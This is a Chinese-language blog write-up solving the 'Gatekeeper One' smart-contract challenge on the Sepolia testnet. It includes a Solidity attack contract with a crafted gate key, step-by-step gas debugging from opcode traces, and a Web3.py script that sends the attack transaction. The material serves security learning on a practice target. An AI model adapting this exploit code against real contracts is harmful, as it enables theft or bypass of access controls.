<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">contract Hack &#123;</span><br><span class="line">    GatekeeperOne public myGate;</span><br><span class="line"></span><br><span class="line">    constructor(address _target) public &#123;</span><br><span class="line">        myGate = GatekeeperOne(_target);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function attack() public &#123;</span><br><span class="line">        myGate.enter(0x123456780000e411);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>查看操作码：</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://cdn.jsdelivr.net/gh/f4tb3e/AutoUploadPics/img/202311291626269.png"
                      alt="image-20231129162654806"
                ></p>
<p>看到整个过程中有两个 REVERT，其中第一个是目标合约 gateTwo 中触发的，顺着往上找到了 GAS。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://cdn.jsdelivr.net/gh/f4tb3e/AutoUploadPics/img/202311291631672.png"
                      alt="image-20231129163152030"
                ></p>
<p>对 GAS 的解释是：在这条指令执行之后剩余的 gas，所以这里的 GAS 就是 gateTwo 中的 gasleft()，调一下 gas 就行。</p>
<p>这里把 GAS LIMIT 设置成819100，继续查看：</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://cdn.jsdelivr.net/gh/f4tb3e/AutoUploadPics/img/202311291637508.png"
                      alt="image-20231129163727465"
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://cdn.jsdelivr.net/gh/f4tb3e/AutoUploadPics/img/202311291638236.png"
                      alt="image-20231129163801201"
                ></p>
<p>结果是780160，819100-780160&#x3D;38940，即为运行到 gasleft() 处花费的 gas。所以我们提供819100+38940&#x3D;858040的 gas 即可通过 gateTwo</p>
<p>。。。吗？</p>
<p>首先上文我犯了个错误，gasleft() 返回值为执行完 GAS 后的剩余 gas 值，所以我们参考的值应该为：</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://cdn.jsdelivr.net/gh/f4tb3e/AutoUploadPics/img/202311291651820.png"
                      alt="image-20231129165123779"
                ></p>
<p>其次，即使我们参考正确的 gas 值进行计算得出理论上正确的 gas limit（858042），也无济于事</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="C:\Users\13246\AppData\Roaming\Typora\typora-user-images\image-20231129165531255.png"
                      alt="image-20231129165531255"
                ></p>
<p>看这个小玩意，问题出在这里，使用 Txn Type 2 会导致 gas 费用是动态的，简单来说是会给到矿工合适的小费，这个“合适”并不固定，所以一直算不准。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://cdn.jsdelivr.net/gh/f4tb3e/AutoUploadPics/img/202311292140786.png"
                      alt="image-20231129214045743"
                ></p>
<p>关于 <a class="link"   href="https://blog.csdn.net/feeltouch/article/details/124975358" >EIP-1559 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>。</p>
<p>由于 Txn Type 0 的交易并不会定义 maxFee 和 maxPriority，即提供多少 gas 是固定的，那么发送这种类型的交易即可。</p>
<p>。。。吗？</p>
<p>猜测：实际上由于 gasPrice 的变化，即使使用 Type 0 也无济于事，只能减少它的浮动范围罢了。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://cdn.jsdelivr.net/gh/f4tb3e/AutoUploadPics/img/202311300207236.png"
                     
                ></p>
<p>结果：把 gas 固定在100000进行测试，每次都一样，从调用直到 GAS 操作码执行完毕消耗27706，把 gas 增加至819100，测试下，到 GAS 之后稳定消耗38942。实在是找不出导致这种现象的原因，一步一步调着先吧，最终调试出 gas 为858660时可以稳定成功。</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://cdn.jsdelivr.net/gh/f4tb3e/AutoUploadPics/img/202311300312620.png"
                      alt="image-20231130031208573" style="zoom:150%;" 
                >

<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://cdn.jsdelivr.net/gh/f4tb3e/AutoUploadPics/img/202311300312156.png"
                      alt="image-20231130031249102"
                ></p>
<p>这里连续执行了5次，都是成功的。</p>
<h3 id="Exploit"><a href="#Exploit" class="headerlink" title="Exploit"></a>Exploit</h3><p>攻击合约：</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">contract Hack &#123;</span><br><span class="line">    GatekeeperOne public myGate;</span><br><span class="line"></span><br><span class="line">    constructor(address _target) public &#123;</span><br><span class="line">        myGate = GatekeeperOne(_target);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function attack() public &#123;</span><br><span class="line">        myGate.enter(0x123456780000e411);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>用于调用攻击合约方法的 python 脚本：</p>
<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> web3 <span class="keyword">import</span> Web3</span><br><span class="line"></span><br><span class="line">web3 = Web3(Web3.HTTPProvider(<span class="string">&#x27;https://rpc.sepolia.org&#x27;</span>))</span><br><span class="line"></span><br><span class="line">sender_address = <span class="string">&#x27;SENDER_ADDRESS&#x27;</span></span><br><span class="line">recipient_address = <span class="string">&#x27;RECIPIENT_ADDRESS&#x27;</span></span><br><span class="line"></span><br><span class="line">private_key = <span class="string">&#x27;YOUR_PRIVATE_KEY&#x27;</span></span><br><span class="line"></span><br><span class="line">transaction_params = &#123;</span><br><span class="line">    <span class="string">&#x27;from&#x27;</span>: sender_address,</span><br><span class="line">    <span class="string">&#x27;to&#x27;</span>: recipient_address,</span><br><span class="line">    <span class="string">&#x27;value&#x27;</span>: <span class="number">0</span>,</span><br><span class="line">    <span class="string">&#x27;data&#x27;</span>: <span class="number">0x9e5faafc</span>,</span><br><span class="line">    <span class="string">&#x27;nonce&#x27;</span>: web3.eth.get_transaction_count(sender_address),</span><br><span class="line">    <span class="string">&#x27;gas&#x27;</span>: <span class="number">858660</span>,</span><br><span class="line">    <span class="string">&#x27;gasPrice&#x27;</span>: web3.eth.gas_price,</span><br><span class="line">    <span class="string">&#x27;chainId&#x27;</span>: <span class="number">11155111</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">transaction = web3.eth.account.sign_transaction(transaction_params, private_key)</span><br><span class="line">transaction_hash = web3.eth.send_raw_transaction(transaction.rawTransaction)</span><br><span class="line">transaction_receipt = web3.eth.wait_for_transaction_receipt(transaction_hash)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> transaction_receipt.status:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;Transaction successful!&#x27;</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;Transaction failed.&#x27;</span>)</span><br></pre></td></tr></table></figure></div>

<p>我也不知道为什么我要写个 py 脚本来调用攻击合约，本来全部东西都可以写进合约里面的，但是我开始有写循环的想法就下意识去用 Web3.py 了。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://cdn.jsdelivr.net/gh/f4tb3e/AutoUploadPics/img/202311300321502.png"
                     
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://cdn.jsdelivr.net/gh/f4tb3e/AutoUploadPics/img/202311300323303.png"
                      alt="image-20231130032336251"
                ></p>
<h2 id="14-Gatekeeper-Two"><a href="#14-Gatekeeper-Two" class="headerlink" title="14 Gatekeeper Two"></a>14 Gatekeeper Two</h2><p>未完待续捏。。</p>
]]></content>
      <categories>
        <category>靶场</category>
      </categories>
      <tags>
        <tag>solidity</tag>
      </tags>
  </entry>
</search>
